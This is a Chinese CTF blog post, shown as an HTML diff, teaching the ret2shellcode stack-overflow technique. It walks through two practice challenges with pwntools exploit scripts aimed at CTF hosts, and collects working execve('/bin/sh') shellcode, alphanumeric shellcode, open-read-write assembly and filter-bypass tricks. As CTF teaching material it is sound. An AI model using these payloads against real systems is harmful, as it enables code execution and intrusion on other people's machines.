@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            PWN练习之ret2shellcode
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="atom.xml" title="D'b8Gr的小站~" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">PWN练习之ret2shellcode</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2025-11-05
+                        </span>
+                        
+                            
+                                <span>
+                                    <i class="iconfont icon-browse"></i> 阅读：<span class="waline-pageview-count" data-path="/posts/2554455252/"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="waline-comment-count" data-path="/posts/2554455252/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">CTF相关</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">CTF知识分享</span>
+                        
+                            <span class="tag-color">pwn</span>
+                        
+                            <span class="tag-color">日常练习</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
+<h3 id="可能的exp姿势"><a href="#可能的exp姿势" class="headerlink" title="可能的exp姿势"></a>可能的exp姿势</h3><h4 id="1-注入shellcode至stack段中"><a href="#1-注入shellcode至stack段中" class="headerlink" title="1.注入shellcode至stack段中"></a>1.注入shellcode至stack段中</h4><p>这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有：</p>
+<ul>
+<li><strong>ASLR</strong>：其功能是将一部分内存段(如栈…)的地址<code>偏移</code>，在注入时难以定位其位置。</li>
+<li><strong>NX</strong>：使得部分内存段(如堆、栈…) <code>不可执行</code>，无法执行注入的代码。</li>
+<li><strong>Canary</strong>：原理是<code>在栈底插入cookie信息</code>，函数返回时将检测该信息<code>是否被改变</code>，若改变，则断定发生栈溢出</li>
+</ul>
+<h4 id="2-注入shellcode至bss段中"><a href="#2-注入shellcode至bss段中" class="headerlink" title="2.注入shellcode至bss段中"></a>2.注入shellcode至bss段中</h4><p>在虚拟内存当中，<code>bss段</code>主要保存无初值的全局变量&#x2F;静态变量(在assmbly中以<code>占位符？</code>声明)。若程序的bss段可写、可执行，则可以把shellcode写入全局变量&#x2F;静态变量中。</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="一-GDOUCTF-2023-Shellcode"><a href="#一-GDOUCTF-2023-Shellcode" class="headerlink" title="一.[GDOUCTF 2023]Shellcode"></a>一.[GDOUCTF 2023]Shellcode</h4><p>拿到二进制文件，习惯性的<code>checksec</code>一下，看栈…的保护措施：</p>
+<p><img src="/images/pwn1.png" alt="pwn1"></p>
+<p>加了<strong>NX</strong>，不过没啥关系，</p>
+<p>放到IDA中反编译，定位到<code>main函数</code>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please.&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;name, <span class="number">0x25uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Nice to meet you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start!&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以利用<code>name</code>来注入shellcode，然后再栈溢出到<code>buf</code>中执行。这里要注意的是<code>name</code>限制了<code>25字节</code>的写入。</p>
+<p>想到利用<code>pwntools</code>里的<code>shellcraft</code>模块直接生成<code>shellcode</code>利用，</p>
+<p>首先试试用<code>shellcraft.sh()</code>，但是这个在32位下占位44字节，64位的则为<code>48字节</code>，超过了25字节的写入限制。于是，便利用<code>shellcraft.cat()</code>来构造<code>cat flag</code>，这个只有0x21字节。</p>
+<p>接着，我们得到<code>name</code>的地址为<code>.bss段</code>的<code>0x6010A0</code>。</p>
+<p>最后的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>还有一种做法是<strong>手动构造shellcode</strong>，找一个小于25字节的shellcode。</p>
+<blockquote>
+<p>NOTE</p>
+<p>32位短字节shellcode(21字节)：</p>
+<p>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p>
+<p>64位短字节shellcode(23字节)：</p>
+<p>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>
+</blockquote>
+<p>其余的基本上不变，下面为第二种exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="二-HNCTF-2022-Week1-safe-shellcode"><a href="#二-HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="二.[HNCTF 2022 Week1]safe_shellcode"></a>二.[HNCTF 2022 Week1]safe_shellcode</h4><p>拿到附件，<code>checksec</code>一下，</p>
+<p><img src="/images/pwn2.png" alt="pwn2"></p>
+<p>保护得还算少，</p>
+<p>IDA中反编译，定位<code>main函数</code>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">524</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x300uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">47</span> || s[i] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buff, s);</span><br><span class="line">  (*(<span class="built_in">void</span> (**)(<span class="type">void</span>))buff)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是先<code>read</code>一下<code>s</code>变量，循环<code>s</code>字节数的次数做判断，<code>strcpy(buff, s)</code>则是将<code>s</code>的值直接存入<code>buff</code>中，其也指向了<code>.bss段</code>。</p>
+<p>要想绕过该判断，只要输入的ascii码在47-122之间即可。0<del>9、A</del>Z、a~z都可。</p>
+<p>我们使用<strong>纯ascii字符的shellcode</strong>：<code>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</code></p>
+<p>因为后面直接调用了<code>buff</code>的地址，所以无须栈溢出即可得到flag。</p>
+<blockquote>
+<p>NOTE</p>
+<p> 32位 短字节shellcode –&gt; 21字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 </p>
+<p> 32位 纯ascii字符shellcode PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA </p>
+<p> 32位 scanf可读取的shellcode \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff&#x2F;bin&#x2F;sh </p>
+<p> 64位 scanf可读取的shellcode 22字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05 </p>
+<p> 64位 较短的shellcode  23字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05 </p>
+<p> 64位 纯ascii字符shellcode Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t </p>
+</blockquote>
+<p>最后的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">26988</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:nssctf&#123;W0www!!!!!!!!!!!Sh311C0d3_m@st3rrr!!&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="一-限制输入长度"><a href="#一-限制输入长度" class="headerlink" title="一.限制输入长度"></a>一.限制输入长度</h4><ol>
+<li><p><strong>利用短字节shellcode(32位)</strong></p>
+<p><code>getshell</code> - 21字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>orw</code> - 56字节</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>无<code>\x00</code>截断<code>getshell</code> - 21字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure>
+
+<p><code>scanf</code>可读取<code>getshell</code> - 41字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>利用短字节shellcode(64位)</strong></p>
+<p><code>getshell</code> - 22字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>orw</code> - 43字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>无<code>\x00</code>截断、<code>scanf</code>可读 - 22字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>\x00截断绕过长度判断</strong></p>
+<p>当题目采用<code>strlen</code>来进行<code>shellcode</code>的长度检测时，可以在其前面加<code>\x00</code>开头的指令绕过长度检测。以下为64位的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 40 00                 add    BYTE PTR [rax+0x0],  al</span><br><span class="line">00 41 00                 add    BYTE PTR [rcx+0x0],  al</span><br><span class="line">00 42 00                 add    BYTE PTR [rdx+0x0],  al</span><br><span class="line">00 43 00                 add    BYTE PTR [rbx+0x0],  al</span><br><span class="line">00 45 00                 add    BYTE PTR [rbp+0x0],  al</span><br><span class="line">00 46 00                 add    BYTE PTR [rsi+0x0],  al</span><br><span class="line">00 47 00                 add    BYTE PTR [rdi+0x0],  al</span><br></pre></td></tr></table></figure>
+
+<p>ps:也可直接<code>\x00\x00</code>绕过</p>
+</li>
+</ol>
+<h4 id="二-限制权限"><a href="#二-限制权限" class="headerlink" title="二.限制权限"></a>二.限制权限</h4><ol>
+<li><p><strong>限制shellcode无读写权限</strong></p>
+<p>利用<code>mprotect</code>给予读写权限，并再次利用<code>read</code>写入执行</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect用法</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>限制远程读flag权限</strong></p>
+<p>先执行<code>setuid(0)</code>，再执行<code>execve</code>来进行<code>getshell</code>。</p>
+</li>
+</ol>
+<!--more-->
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/static/avatar/avatar0.jpg" alt="D'b8Gr">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>D'b8Gr
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="" target="_blank">PWN练习之ret2shellcode</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>I hack,therefore I am.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="../../category/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="../../tag/CTF%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/">CTF知识分享</a>
+                        
+                            <a href="../../tag/pwn/">pwn</a>
+                        
+                            <a href="../../tag/%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/">日常练习</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="../2957710030/" class="prev-prefix">« </a> 上一篇：    <a href="../2957710030/" title="发布于 2025-11-07 12:00">Re练习之ASM汇编逆向</a>
+                        <br>
+                    
+                    
+                        <a href="../4126005536/" class="next-prefix">» </a> 下一篇：    <a href="../4126005536/" title="发布于 2025-11-01 12:00">?CTF2025 week4部分WP</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+        <!-- 样式文件 -->
+        <link rel="stylesheet" href="/css/waline.css"/>
+        <link rel="stylesheet" href="/css/waline-custom.css"/>
+        <!-- 脚本文件 -->
+        <script type="module">
+            import { init } from "/js/waline.mjs";
+
+            const WalineInstance = init({
+                el              : ".comments-content",
+                serverURL       : "https://waline-pi-blue-88.vercel.app/",
+                path            : window.location.pathname,
+                meta            : ['nick', 'mail', 'link'],
+                requiredMeta    : ['nick', 'mail'],
+                pageSize        : 10,
+                lang            : "zh-cn",
+                locale: {
+                    admin       : "博主",
+                    anonymous   : "匿名用户",
+                    sofa        : "快来做第一个评论的人吧 ~",
+                    placeholder : "你是我一生只会遇见一次的惊喜...",
+                },
+                dark            : "html[color-scheme='dark']",
+                search          : false,
+                pageview        : true,
+                comment         : true,
+                copyright       : false,
+            });
+
+            // Waline 输入框选中动画
+            $(document).on("focus", ".wl-header-item .wl-input", function() {
+                $(this).parent().css("border-bottom-color", "var(--input-border-color-focus)");
+            });
+
+            $(document).on("blur", ".wl-header-item .wl-input", function() {
+                $(this).parent().css("border-bottom-color", "var(--input-border-color)");
+            });
+        </script>
+    
+ 
+        </div>
+    
+</div>
+    <div id="footer">
